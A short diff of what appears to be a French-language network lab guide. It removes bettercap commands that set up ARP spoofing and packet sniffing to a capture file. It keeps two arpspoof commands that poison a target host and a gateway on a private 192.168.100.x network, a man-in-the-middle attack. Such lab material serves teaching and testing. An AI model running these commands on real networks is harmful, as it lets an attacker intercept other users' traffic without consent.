@@ -310,12 +310,6 @@ Dans la console bettercap :
 net.recon on
 net.show
 
-set arp.spoof.targets 192.168.100.10
-arp.spoof on
-
-set net.sniff.output /root/capture.pcap
-net.sniff on
-
 arpspoof -i enp0s3 -t 192.168.100.10 192.168.100.1
 arpspoof -i enp0s3 -t 192.168.100.1 192.168.100.10
 
